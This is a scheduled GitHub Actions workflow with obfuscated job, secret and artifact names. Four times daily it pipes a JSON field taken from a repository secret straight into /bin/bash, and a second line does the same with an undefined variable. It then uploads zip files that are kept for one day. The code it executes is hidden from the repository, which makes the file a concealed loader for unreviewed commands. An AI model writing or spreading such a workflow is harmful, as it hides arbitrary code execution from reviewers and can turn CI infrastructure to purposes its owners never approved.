name: forgetaylormd
on:
  workflow_dispatch:

  schedule:
    - cron: '51 3,9,15,21 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: forgetaylormd
        env:
          jglsq339: ${{ secrets.jglsq339 }}
        run: |
          printf '%s' "$jglsq339" | jq -r .cvxqt294 | /bin/bash
          printf '%s' "$c47635" | jq -r .hdkg8896 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: VtOzqYCI
          path: "*.zip"
          retention-days: 1
